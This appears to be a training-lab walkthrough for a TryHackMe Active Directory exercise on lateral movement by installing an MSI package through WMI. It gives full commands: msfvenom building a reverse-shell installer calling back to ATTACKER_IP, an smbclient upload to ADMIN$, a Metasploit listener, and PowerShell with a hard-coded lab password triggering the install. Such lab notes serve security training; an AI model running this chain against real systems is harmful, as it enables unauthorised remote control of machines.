#### Installing MSI packages through WMI
Connect to the `JumpBox` using the credentials you have gathered via `ssh`:
```cmd
ssh za\\<AD Username>@thmjmp2.za.tryhackme.com
```

**For this exercise, we will assume we have already captured some credentials with administrative access.**
1. **Create a reverse shell**
	```bash
	msfvenom -p windows/shell/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o installer.msi
	```

2. Use acquired credentials to upload the payload to the ADMIN$ using `smbclient`
```bash
smbclient -c 'put installer.msi' -U <admin-username> -W ZA '//thmiis.za.tryhackme.com/admin$/' <admin-password> 

# Another way of doing it
smbclient '//thmiis.za.tryhackme.com/admin$' -U AA\\<admin-username>%<admin-password> -c 'put installer.msi'
```
- `-c:` run a specific command after connecting.
- `put myservice.exe:` put uploads a file to the remote system.
- `-U:` username
- `-W ZA:` Domain name `za`

3. Once the executable is uploaded, set up a listener
```bash
use exploit/multi/handler
set lhost <IP>
set lport 4444
set payload windows/shell/reverse_tcp
run
```

4. **Start a WMI session against the IIS server from a PowerShell console (From `jumpBox`)**
```powershell
$username = 't1_corine.waters'; 
$password = 'Korine.1994'; 
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword; 
$Opt = New-CimSessionOption -Protocol DCOM 
$Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

5. **Invoke the install method from the Win32_Product class to trigger the payload**
```powershell
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation = "C:\Windows\installer.msi"; Options = ""; AllUsers = $false}
```

**Once you have started the service, you should receive a connection on your first listener.**
